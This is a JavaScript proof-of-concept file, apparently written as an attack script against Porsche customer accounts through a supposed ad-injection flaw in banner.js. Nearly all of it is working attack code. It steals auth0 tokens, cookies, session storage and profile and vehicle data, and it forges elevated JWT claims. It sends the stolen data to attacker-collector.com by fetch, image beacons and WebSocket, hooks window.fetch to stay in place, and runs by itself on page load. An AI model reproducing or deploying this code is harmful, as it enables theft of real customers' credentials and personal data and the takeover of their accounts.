/**
 * PoC Script 1: Customer Account Takeover
 * Target: Regular Porsche customers via malicious ad injection
 * Entry Point: banner.js ad content loading vulnerability
 * Impact: Access to vehicle data, purchase history, personal information
 */

class CustomerAccountTakeoverPoC {
    constructor() {
        this.attackId = 'CUSTOMER_TAKEOVER_' + Date.now();
        this.exfiltrationEndpoint = 'https://attacker-collector.com/customer-data';
        this.persistenceKey = 'porsche_customer_session_backup';
        this.targetTokens = ['auth0.access_token', 'auth0.id_token', 'auth0.refresh_token'];
    }

    /**
     * Phase 1: Initial Reconnaissance
     * Gather customer data and authentication state
     */
    async performReconnaissance() {
        console.log('[ATTACK] Phase 1: Reconnaissance started');
        
        const customerData = {
            // Authentication tokens
            tokens: this.extractAuthenticationTokens(),
            
            // Customer profile data
            profile: this.extractCustomerProfile(),
            
            // Vehicle and service data
            vehicleData: this.extractVehicleData(),
            
            // Browser and session info
            sessionInfo: {
                userAgent: navigator.userAgent,
                currentUrl: window.location.href,
                referrer: document.referrer,
                timestamp: Date.now(),
                sessionStorage: this.extractSessionStorage(),
                cookies: this.extractAuthCookies()
            }
        };

        // Store for later use
        this.customerData = customerData;
        
        console.log('[ATTACK] Customer data extracted:', customerData);
        return customerData;
    }

    /**
     * Extract authentication tokens from localStorage
     */
    extractAuthenticationTokens() {
        const tokens = {};
        
        this.targetTokens.forEach(tokenKey => {
            const token = localStorage.getItem(tokenKey);
            if (token) {
                try {
                    // Decode JWT payload
                    const payload = JSON.parse(atob(token.split('.')[1]));
                    tokens[tokenKey] = {
                        raw: token,
                        payload: payload,
                        isValid: this.validateTokenExpiry(payload),
                        permissions: payload.permissions || [],
                        roles: payload.roles || []
                    };
                } catch (e) {
                    tokens[tokenKey] = { raw: token, error: 'Invalid JWT format' };
                }
            }
        });

        return tokens;
    }

    /**
     * Extract customer profile information
     */
    extractCustomerProfile() {
        const profileKeys = [
            'auth0.user_profile',
            'customer_profile',
            'user_preferences',
            'porsche_customer_data'
        ];

        const profile = {};
        profileKeys.forEach(key => {
            const data = localStorage.getItem(key);
            if (data) {
                try {
                    profile[key] = JSON.parse(data);
                } catch (e) {
                    profile[key] = data;
                }
            }
        });

        return profile;
    }

    /**
     * Extract vehicle and service related data
     */
    extractVehicleData() {
        const vehicleKeys = Object.keys(localStorage).filter(key => 
            key.includes('vehicle') || 
            key.includes('configuration') || 
            key.includes('service') ||
            key.includes('booking')
        );

        const vehicleData = {};
        vehicleKeys.forEach(key => {
            const data = localStorage.getItem(key);
            try {
                vehicleData[key] = JSON.parse(data);
            } catch (e) {
                vehicleData[key] = data;
            }
        });

        return vehicleData;
    }

    /**
     * Extract session storage data
     */
    extractSessionStorage() {
        const sessionData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionData[key] = sessionStorage.getItem(key);
        }
        return sessionData;
    }

    /**
     * Extract authentication-related cookies
     */
    extractAuthCookies() {
        return document.cookie.split(';')
            .filter(cookie => 
                cookie.includes('auth') || 
                cookie.includes('session') || 
                cookie.includes('token')
            )
            .map(cookie => cookie.trim());
    }

    /**
     * Validate token expiry
     */
    validateTokenExpiry(payload) {
        if (!payload.exp) return false;
        return payload.exp > (Date.now() / 1000);
    }

    /**
     * Phase 2: Token Manipulation and Privilege Escalation
     * Create enhanced customer tokens with additional privileges
     */
    async escalatePrivileges() {
        console.log('[ATTACK] Phase 2: Privilege escalation started');

        const originalToken = this.customerData.tokens['auth0.access_token'];
        if (!originalToken || !originalToken.payload) {
            console.log('[ATTACK] No valid token found, creating fake customer token');
            return this.createFakeCustomerToken();
        }

        // Enhance existing customer token with additional privileges
        const enhancedPayload = {
            ...originalToken.payload,
            // Add premium customer privileges
            roles: [...(originalToken.payload.roles || []), 'premium_customer', 'vip_member'],
            permissions: [
                ...(originalToken.payload.permissions || []),
                'access:all_models',
                'book:any_vehicle',
                'access:premium_features',
                'view:all_configurations',
                'modify:profile_extended'
            ],
            // Extend expiry
            exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60), // 1 year
            // Add custom claims
            customer_tier: 'platinum',
            unlimited_access: true,
            bypass_restrictions: true
        };

        const enhancedToken = this.createJWT(enhancedPayload);
        
        // Replace tokens
        localStorage.setItem('auth0.access_token', enhancedToken);
        localStorage.setItem('auth0.id_token', enhancedToken);
        
        // Update user profile
        const enhancedProfile = {
            ...this.customerData.profile['auth0.user_profile'],
            customer_tier: 'platinum',
            vip_status: true,
            unlimited_access: true
        };
        
        localStorage.setItem('auth0.user_profile', JSON.stringify(enhancedProfile));

        console.log('[ATTACK] Privileges escalated - customer now has premium access');
        return enhancedToken;
    }

    /**
     * Create fake customer token if no valid token exists
     */
    createFakeCustomerToken() {
        const fakePayload = {
            sub: 'fake_customer_' + Date.now(),
            email: 'fake.customer@email.com',
            name: 'Compromised Customer',
            roles: ['customer', 'premium_customer', 'vip_member'],
            permissions: [
                'access:all_models',
                'book:any_vehicle',
                'access:premium_features',
                'view:all_configurations'
            ],
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
            aud: 'porsche-customer-api',
            iss: 'https://porsche.auth0.com/',
            customer_tier: 'platinum'
        };

        const fakeToken = this.createJWT(fakePayload);
        
        localStorage.setItem('auth0.access_token', fakeToken);
        localStorage.setItem('auth0.id_token', fakeToken);
        localStorage.setItem('auth0.user_profile', JSON.stringify(fakePayload));

        return fakeToken;
    }

    /**
     * Create JWT token (simplified - real attack would need proper signing)
     */
    createJWT(payload) {
        const header = { typ: 'JWT', alg: 'HS256' };
        const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
        const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
        const signature = 'FAKE_SIGNATURE_' + this.attackId;
        
        return `${encodedHeader}.${encodedPayload}.${signature}`;
    }

    /**
     * Phase 3: Data Exfiltration
     * Send stolen customer data to attacker server
     */
    async exfiltrateCustomerData() {
        console.log('[ATTACK] Phase 3: Data exfiltration started');

        const exfiltrationPackage = {
            attack_id: this.attackId,
            timestamp: Date.now(),
            target_type: 'customer_account',
            stolen_data: this.customerData,
            escalated_tokens: {
                access_token: localStorage.getItem('auth0.access_token'),
                user_profile: localStorage.getItem('auth0.user_profile')
            },
            attack_metadata: {
                entry_point: 'banner.js_ad_injection',
                success: true,
                persistence_established: false
            }
        };

        // Multiple exfiltration attempts with different methods
        const exfiltrationMethods = [
            () => this.exfiltrateViaFetch(exfiltrationPackage),
            () => this.exfiltrateViaImage(exfiltrationPackage),
            () => this.exfiltrateViaWebSocket(exfiltrationPackage),
            () => this.exfiltrateViaLocalStorage(exfiltrationPackage)
        ];

        for (const method of exfiltrationMethods) {
            try {
                await method();
                console.log('[ATTACK] Exfiltration successful via method:', method.name);
                break;
            } catch (e) {
                console.log('[ATTACK] Exfiltration method failed:', method.name, e.message);
                continue;
            }
        }
    }

    /**
     * Exfiltration via fetch API
     */
    async exfiltrateViaFetch(data) {
        const response = await fetch(this.exfiltrationEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Attack-ID': this.attackId
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Fetch exfiltration failed');
        }
    }

    /**
     * Exfiltration via image beacon
     */
    exfiltrateViaImage(data) {
        return new Promise((resolve, reject) => {
            const img = new Image();
            const encodedData = btoa(JSON.stringify(data));
            
            img.onload = () => resolve();
            img.onerror = () => reject(new Error('Image exfiltration failed'));
            
            // Split data if too large for URL
            const maxUrlLength = 2000;
            if (encodedData.length > maxUrlLength) {
                const chunks = encodedData.match(new RegExp(`.{1,${maxUrlLength}}`, 'g'));
                chunks.forEach((chunk, index) => {
                    const chunkImg = new Image();
                    chunkImg.src = `${this.exfiltrationEndpoint}/chunk?id=${this.attackId}&part=${index}&data=${chunk}`;
                });
            } else {
                img.src = `${this.exfiltrationEndpoint}/image?data=${encodedData}`;
            }
        });
    }

    /**
     * Exfiltration via WebSocket
     */
    exfiltrateViaWebSocket(data) {
        return new Promise((resolve, reject) => {
            const ws = new WebSocket(this.exfiltrationEndpoint.replace('https://', 'wss://'));
            
            ws.onopen = () => {
                ws.send(JSON.stringify(data));
                ws.close();
                resolve();
            };
            
            ws.onerror = () => reject(new Error('WebSocket exfiltration failed'));
            
            setTimeout(() => {
                ws.close();
                reject(new Error('WebSocket timeout'));
            }, 5000);
        });
    }

    /**
     * Exfiltration via localStorage (for later retrieval)
     */
    exfiltrateViaLocalStorage(data) {
        const storageKey = `exfil_${this.attackId}_${Date.now()}`;
        localStorage.setItem(storageKey, JSON.stringify(data));
        
        // Set up periodic beacon to signal data availability
        const beacon = setInterval(() => {
            const img = new Image();
            img.src = `${this.exfiltrationEndpoint}/beacon?storage_key=${storageKey}`;
        }, 30000); // Every 30 seconds

        // Clean up after 24 hours
        setTimeout(() => {
            clearInterval(beacon);
            localStorage.removeItem(storageKey);
        }, 24 * 60 * 60 * 1000);

        return Promise.resolve();
    }

    /**
     * Phase 4: Establish Persistence
     * Create mechanisms for ongoing access
     */
    async establishPersistence() {
        console.log('[ATTACK] Phase 4: Establishing persistence');

        // Method 1: Backup authentication in hidden storage
        const backupAuth = {
            tokens: {
                access: localStorage.getItem('auth0.access_token'),
                id: localStorage.getItem('auth0.id_token'),
                refresh: localStorage.getItem('auth0.refresh_token')
            },
            profile: localStorage.getItem('auth0.user_profile'),
            created: Date.now(),
            expires: Date.now() + (365 * 24 * 60 * 60 * 1000) // 1 year
        };

        localStorage.setItem(this.persistenceKey, btoa(JSON.stringify(backupAuth)));

        // Method 2: Hook into authentication refresh
        this.hookTokenRefresh();

        // Method 3: Periodic privilege restoration
        this.setupPrivilegeRestoration();

        console.log('[ATTACK] Persistence mechanisms established');
    }

    /**
     * Hook into token refresh to maintain elevated privileges
     */
    hookTokenRefresh() {
        const originalFetch = window.fetch;
        const self = this;

        window.fetch = function(...args) {
            const [url, options] = args;
            
            // Intercept auth refresh requests
            if (url.includes('/oauth/token') || url.includes('/auth/refresh')) {
                return originalFetch.apply(this, args).then(response => {
                    if (response.ok) {
                        // Re-escalate privileges after token refresh
                        setTimeout(() => {
                            self.escalatePrivileges();
                        }, 1000);
                    }
                    return response;
                });
            }
            
            return originalFetch.apply(this, args);
        };
    }

    /**
     * Set up periodic privilege restoration
     */
    setupPrivilegeRestoration() {
        const self = this;
        
        // Check and restore privileges every 5 minutes
        setInterval(() => {
            const currentToken = localStorage.getItem('auth0.access_token');
            if (currentToken) {
                try {
                    const payload = JSON.parse(atob(currentToken.split('.')[1]));
                    
                    // Check if privileges have been downgraded
                    if (!payload.roles?.includes('premium_customer')) {
                        console.log('[ATTACK] Privileges downgraded, restoring...');
                        self.escalatePrivileges();
                    }
                } catch (e) {
                    // Token invalid, restore from backup
                    self.restoreFromBackup();
                }
            } else {
                // No token, restore from backup
                self.restoreFromBackup();
            }
        }, 5 * 60 * 1000); // Every 5 minutes
    }

    /**
     * Restore authentication from backup
     */
    restoreFromBackup() {
        const backup = localStorage.getItem(this.persistenceKey);
        if (backup) {
            try {
                const backupData = JSON.parse(atob(backup));
                
                // Check if backup is still valid
                if (backupData.expires > Date.now()) {
                    localStorage.setItem('auth0.access_token', backupData.tokens.access);
                    localStorage.setItem('auth0.id_token', backupData.tokens.id);
                    localStorage.setItem('auth0.user_profile', backupData.profile);
                    
                    console.log('[ATTACK] Authentication restored from backup');
                }
            } catch (e) {
                console.log('[ATTACK] Backup restoration failed:', e.message);
            }
        }
    }

    /**
     * Execute complete customer account takeover
     */
    async executeAttack() {
        try {
            console.log('[ATTACK] Starting customer account takeover...');
            
            // Phase 1: Reconnaissance
            await this.performReconnaissance();
            
            // Phase 2: Privilege Escalation
            await this.escalatePrivileges();
            
            // Phase 3: Data Exfiltration
            await this.exfiltrateCustomerData();
            
            // Phase 4: Persistence
            await this.establishPersistence();
            
            console.log('[ATTACK] Customer account takeover completed successfully');
            
            // Demonstrate the impact
            this.demonstrateImpact();
            
        } catch (error) {
            console.error('[ATTACK] Attack failed:', error);
        }
    }

    /**
     * Demonstrate the impact of successful attack
     */
    demonstrateImpact() {
        const impact = {
            compromised_data: Object.keys(this.customerData).length,
            elevated_privileges: true,
            persistent_access: true,
            potential_actions: [
                'Access all vehicle configurations',
                'Book premium services without payment',
                'View other customers\' data (if API allows)',
                'Modify customer profile and preferences',
                'Access exclusive Porsche content and features'
            ]
        };

        console.log('[ATTACK] Impact assessment:', impact);
        
        // Show visual proof of compromise
        if (typeof document !== 'undefined') {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff4444;
                color: white;
                padding: 15px;
                border-radius: 5px;
                z-index: 9999;
                font-family: Arial, sans-serif;
                max-width: 300px;
            `;
            notification.innerHTML = `
                <h3>🚨 ACCOUNT COMPROMISED</h3>
                <p>Customer account has been taken over!</p>
                <ul>
                    <li>✅ Premium privileges gained</li>
                    <li>✅ Data exfiltrated</li>
                    <li>✅ Persistent access established</li>
                </ul>
            `;
            document.body.appendChild(notification);
            
            // Remove notification after 10 seconds
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 10000);
        }
    }
}

// Auto-execute if in browser environment
if (typeof window !== 'undefined') {
    // Wait for page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            const attack = new CustomerAccountTakeoverPoC();
            attack.executeAttack();
        });
    } else {
        const attack = new CustomerAccountTakeoverPoC();
        attack.executeAttack();
    }
}

// Export for manual execution
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CustomerAccountTakeoverPoC;
}